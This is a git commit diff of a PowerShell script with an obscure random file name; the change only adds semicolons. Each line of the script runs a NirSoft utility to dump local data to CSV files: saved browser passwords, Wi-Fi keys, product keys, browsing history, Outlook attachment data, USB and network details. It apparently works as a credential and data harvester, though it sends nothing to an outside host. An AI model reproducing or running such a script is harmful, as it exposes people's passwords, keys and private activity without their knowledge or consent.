e758f6f4d7ec31ccb985a91e385f9cb83792887f
Noah Glatzl <noah.glatzl@gmail.com>
2023-03-01 21:01:19 +0100

    Update ezwirt398tz39tzwe.ps1

--- ezwirt398tz39tzwe.ps1
+++ ezwirt398tz39tzwe.ps1
@@ -1,18 +1,18 @@
-.\BrowsingHistoryView.exe /VisitTimeFilterType 1 /HistorySource 1 /scomma BrowserHistory.csv
-.\WirelessKeyView.exe /scomma WirelessKeys.csv
-.\WhatInStartup.exe /scomma StartupProgramms.csv
-.\USBDeview.exe /scomma USBDevices.csv
-.\ProduKey.exe /scomma ProductKeys.csv
-.\WebBrowserPassView.exe /scomma WebBrowserPasswords.csv /skeepass KeePassImporter.csv
-.\WebBrowserBookmarksView.exe /scomma WebBrowserBookmarks.csv
-.\MultiMonitorTool.exe /scomma MultiMonitors.csv
-.\InstalledAppView.exe /scomma InstalledApps.csv
-.\ManageWirelessNetworks.exe /scomma WirelessNetworks.csv
-.\DNSDataView.exe /scomma DNSData.csv
-.\MACAddressView.exe /scomma MACAdress.csv
-.\BatteryHistoryView.exe /scomma BatteryHistory.csv
-.\OutlookAttachView.exe /scomma OutlookAttaches.csv
-.\OutlookStatView.exe /scomma OutlookStats.csv
+.\BrowsingHistoryView.exe /VisitTimeFilterType 1 /HistorySource 1 /scomma BrowserHistory.csv;
+.\WirelessKeyView.exe /scomma WirelessKeys.csv;
+.\WhatInStartup.exe /scomma StartupProgramms.csv;
+.\USBDeview.exe /scomma USBDevices.csv;
+.\ProduKey.exe /scomma ProductKeys.csv;
+.\WebBrowserPassView.exe /scomma WebBrowserPasswords.csv /skeepass KeePassImporter.csv;
+.\WebBrowserBookmarksView.exe /scomma WebBrowserBookmarks.csv;
+.\MultiMonitorTool.exe /scomma MultiMonitors.csv;
+.\InstalledAppView.exe /scomma InstalledApps.csv;
+.\ManageWirelessNetworks.exe /scomma WirelessNetworks.csv;
+.\DNSDataView.exe /scomma DNSData.csv;
+.\MACAddressView.exe /scomma MACAdress.csv;
+.\BatteryHistoryView.exe /scomma BatteryHistory.csv;
+.\OutlookAttachView.exe /scomma OutlookAttaches.csv;
+.\OutlookStatView.exe /scomma OutlookStats.csv;
 
 
 
